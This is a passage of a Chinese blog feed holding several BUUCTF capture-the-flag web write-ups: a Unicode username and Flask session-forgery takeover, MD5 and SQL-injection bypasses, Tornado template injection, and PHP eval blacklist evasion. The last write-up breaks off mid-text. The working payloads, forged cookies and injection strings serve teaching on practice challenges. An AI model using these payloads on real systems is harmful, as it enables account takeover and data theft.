invoke__">strlower</span>(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>).<span class="title function_ invoke__">lower</span>() != form.verify_code.data.<span class="title function_ invoke__">lower</span>():</span><br><span class="line">            <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.<span class="title function_ invoke__">filter_by</span>(username = name).<span class="title function_ invoke__">first</span>():</span><br><span class="line">            <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = <span class="title function_ invoke__">User</span>(username=name)</span><br><span class="line">        user.<span class="title function_ invoke__">set_password</span>(form.password.data)</span><br><span class="line">        db.session.<span class="title function_ invoke__">add</span>(user)</span><br><span class="line">        db.session.<span class="title function_ invoke__">commit</span>()</span><br><span class="line">        <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">login</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    form = <span class="title function_ invoke__">LoginForm</span>()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = <span class="title function_ invoke__">strlower</span>(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.<span class="title function_ invoke__">filter_by</span>(username=name).<span class="title function_ invoke__">first</span>()</span><br><span class="line">        <span class="keyword">if</span> user is None <span class="keyword">or</span> not user.<span class="title function_ invoke__">check_password</span>(form.password.data):</span><br><span class="line">            <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="title function_ invoke__">login_user</span>(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/logout&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">logout</span>():</span><br><span class="line">    <span class="title function_ invoke__">logout_user</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">change</span>():</span><br><span class="line">    <span class="keyword">if</span> not current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = <span class="title function_ invoke__">NewpasswordForm</span>()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = <span class="title function_ invoke__">strlower</span>(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.<span class="title function_ invoke__">filter_by</span>(username=name).<span class="title function_ invoke__">first</span>()</span><br><span class="line">        user.<span class="title function_ invoke__">set_password</span>(form.newpassword.data)</span><br><span class="line">        db.session.<span class="title function_ invoke__">commit</span>()</span><br><span class="line">        <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">edit</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">flash</span>(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">errorhandler</span>(<span class="number">404</span>)</span><br><span class="line">def <span class="title function_ invoke__">page_not_found</span>(error):</span><br><span class="line">    title = <span class="title function_ invoke__">unicode</span>(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">strlower</span>(username):</span><br><span class="line">    username = nodeprep.<span class="title function_ invoke__">prepare</span>(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><h2 id="预期解一："><a href="#预期解一：" class="headerlink" title="预期解一："></a>预期解一：</h2><p>unicode特殊字符绕过</p><p>代码审计 看到上面注册，登录，修改系统均有一个转小写的操作strlower(),并且这个转小写的函数不是python自带的，是自己封装的，那么这是非常不正常的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">strlower</span>(username):</span><br><span class="line">    username = nodeprep.<span class="title function_ invoke__">prepare</span>(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>这里通过调用nodeprep模块，nodeprep.prepare这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A</p><p>在代码开头有一行代码：<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，说明nodeprep是从twisted模块中导入的，利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。而值得注意的是strlower()自定义函数被调用了三次，分别是register、login、change，即注册、登陆、修改密码时都会被调用。</p><p>思路：用ᴬdmin注册，后台代码就会调用一次nodeprep.prepare函数，把用户名转换成Admin；修改一次密码，再次调用nodeprep.prepare函数，使用户名由Admin转换为admin，重新登陆，就可以得到flag。</p><h2 id="预期解二："><a href="#预期解二：" class="headerlink" title="预期解二："></a>预期解二：</h2><p>抓包发现session</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png" alt="img"></p><p>flask session伪造</p><p>先了解一下session：简单说就是保持会话登录，识别用户</p><p>但是一般session是存储在服务器的，但是flask存储在客户端，他是对称加密解密，所以可以进行解码然后伪造编码上传。</p><p>在config.py拿到密钥<code>ckj123</code> 待会进行加密解密的时候用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">SECRET_KEY</span> = <span class="title">os</span>.<span class="title">environ</span>.<span class="title">get</span>(&#x27;<span class="title">SECRET_KEY</span>&#x27;) <span class="title">or</span> &#x27;<span class="title">ckj123</span>&#x27;</span></span><br><span class="line"><span class="class">    <span class="title">SQLALCHEMY_DATABASE_URI</span> = &#x27;<span class="title">mysql</span>+<span class="title">pymysql</span>://<span class="title">root</span>:<span class="title">adsl1234</span>@<span class="title">db</span>:3306/<span class="title">test</span>&#x27;</span></span><br><span class="line"><span class="class">    <span class="title">SQLALCHEMY_TRACK_MODIFICATIONS</span> = <span class="title">True</span></span></span><br></pre></td></tr></table></figure><p>从网上下载一个session 解密加密的脚本</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &quot;.eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png" alt="img"></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74&#x27;, &#x27;csrf_token&#x27;: b&#x27;fde2b35f0dd325646bb89103d3f068da2657ca94&#x27;, &#x27;image&#x27;: b&#x27;JmGR&#x27;, &#x27;name&#x27;: &#x27;abc&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>将我们创建的abc改为admin 然后再加密 bp抓包修改</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74&#x27;, &#x27;csrf_token&#x27;: b&#x27;fde2b35f0dd325646bb89103d3f068da2657ca94&#x27;, &#x27;image&#x27;: b&#x27;JmGR&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png" alt="img"></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY</span><br></pre></td></tr></table></figure><p>更换session，成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask框架 </tag>
            
            <tag> 弱口令 </tag>
            
            <tag> unicode特殊字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 21-[BJDCTF2020]Easy MD5</title>
      <link href="/post/eef45ee2.html"/>
      <url>/post/eef45ee2.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [BJDCTF2020]Easy MD5</p><span id="more"></span><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347242.png" alt="img"></p><p>思路：看到url上又password字样，又有输入栏，随便传入admin然后抓包试试，发现提示。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png" alt="img"></p><p>显示<code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><p><strong>分析：通过sql语句，从admin表里查数据，当password&#x3D;md（）函数加密后的pass时就可查询。</strong></p><p><strong>考点：</strong></p><ol><li><strong>sql语句注入</strong></li><li><strong>md5（）函数：本来应该返回32 位的十六进制数形式散列值，但是此题可选的 binary 被设置为 true，那么 md5 摘要将以 16 位的原始二进制格式返回。</strong></li></ol><p>看到作业提示md5在sql注入中常见的搭档是字符串ffifdyop，然后去谷歌，csdn看看这是什么东西。</p><p><strong>ffifdyop</strong></p><p>经过<a href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p><p><strong>原理：md5（）函数先把</strong> <code>**ffifdyop**</code><strong>加密为</strong><code>**276f722736c95d99e921722cf9ed621c**</code><strong>Mysql 又会把 hex （十六进制）转成 ascii 解释</strong> </p><p> 在or的两边要有单引号，使它变成 password&#x3D;‘xxx’or‘xxx’ 的形式  </p><p> 因此拼接之后的形式是select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’  为一个永真式</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347249.png" alt="img"></p><p>输入得到代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p><strong>分析：通过get传参a，b，使得题目md5值弱相等 。</strong></p><p><strong>方法：</strong></p><ol><li><strong>数组绕过</strong></li><li><strong>md5（）值碰撞，有一些特殊的数值在md5（）加密后会形成0e开头的字符串，从而达到弱相等</strong></li></ol><p><strong>md5（）碰撞原理：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;他们弱相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">他们弱相等</span><br></pre></td></tr></table></figure><p>选择任何方法都行，之后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，不过之后是强类型相等，估计这一关是考察数组绕过吧，之后得到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347369.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5绕过 </tag>
            
            <tag> ffifdyop特殊字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 20-[护网杯 2018]easy_tornado</title>
      <link href="/post/98e6259a.html"/>
      <url>/post/98e6259a.html</url>
      
        <content type="html"><![CDATA[<p>buuctf 20-[护网杯 2018]easy_tornado</p><span id="more"></span><p>这是一道毫无头绪的题目，就当作学习了。</p><p>进入之后有三个页面内容分别为：</p><p>flag in &#x2F;fllllllllllllag</p><p>render</p><p>md5(cookie_secret+md5(filename))</p><p>发现请求过程很奇怪</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349588.png" alt="img"></p><p>通过filename请求一个文件然后filehash请求一个哈西值 也就是加密了一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349619.png" alt="img"></p><p>如果不请求哈希值试一下 直接报错，并且注意：<code>/error?msg=Error</code>直接来看大佬的wp</p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快</p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是<code>handler.settings</code>，<code>handler</code>指向<code>RequestHandler</code>，而<code>RequestHandler.settings</code>又指向<code>self.application.settings</code>，所以handler.settings就指向<code>RequestHandler.application.settings</code>了，这里面就是我们的一些环境变量.</p><p>然后通过环境变量去获取<code>cookie_secret</code></p><p>构造payload ：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p><p>得到：<code>&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;76a26309-3853-4c68-b91e-eee75246e722&#39;&#125;</code></p><p>发现了<code>cookie_secret </code></p><p>之后将<code>/fllllllllllllag</code>加密一下将<code>cookie_secret</code> 加上 再进行一次md5加密就可以获得flag了</p><p>构造payload：<code>?filename=/fllllllllllllag&amp;filehash=99d14d071426405f00eca73ec4a5eb64</code></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> render渲染 </tag>
            
            <tag> python </tag>
            
            <tag> 环境变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 18-[RoarCTF 2019]Easy Calc</title>
      <link href="/post/318fd29a.html"/>
      <url>/post/318fd29a.html</url>
      
        <content type="html"><![CDATA[<p>buuctf 18-[RoarCTF 2019]Easy Calc</p><span id="more"></span><p>抓包发现提交方式为：</p><p>给&#x2F;cal.php 以get方式提交一个$num变量</p><p>发现黑名单过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现好多读文件的空格，斜杠都被黑名单了。</p><p>csdn有一篇总结的很好，拉过来</p><p>知识点：</p><p>chr() 函数：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</p><p> file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><p> PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p> scandir() 函数：返回指定目录中的文件和目录的数组。</p><p>构造：<code>? num=var_dump(scandir(chr(47)))</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082348852.png" alt="img"></p><p>发现flag文件，现在构造payload将里面内容读出来就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>这里最好不用echo 因为空格被黑名单了 用print_r或者var_dump都行</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> php字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 6-[强网杯 2019]随便注</title>
      <link href="/post/73bb3fc4.html"/>
      <url>/post/73bb3fc4.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [强网杯 2019]随便注</p><span id="more"></span><p>正常操作后，发现只有两列，然后有正则匹配过滤了</p><p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p><p>这题考了堆叠注入，原理很简单，就是通过 <code>;</code> 号注入多条SQL语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show databases;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349074.png" alt="img"></p><p>看一下当前的数据库，这里考到了报错注入</p><p>原理：</p><p>MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p><p>但是这题update被过滤了</p><p>extractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。</p><p>sql里拼接函数：concat，concat_ws ,group_concat</p><p><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e));</code> 0x7e 是十六进制~</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349098.png" alt="img"></p><p>当前数据库在supersqli 注意结果是按照报错的方式回显的。</p><p><code>-1&#39;;show tables;</code>爆表</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349087.png" alt="img"></p><p>flag在那串数字里</p><p>表名为数字时，要用反引号包起来查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349045.png" alt="img"></p><p>然后要使用存储过程预编译知识，构造能执行的语句</p><p>方法一：</p><p>set @name1 &#x3D; sql 语句；</p><p>prepare name2 from @name1</p><p>EXECUTE name2</p><p>注意：一个@是用户变量，两个@是系统变量</p><p>方法二：</p><p>prepare name1 from 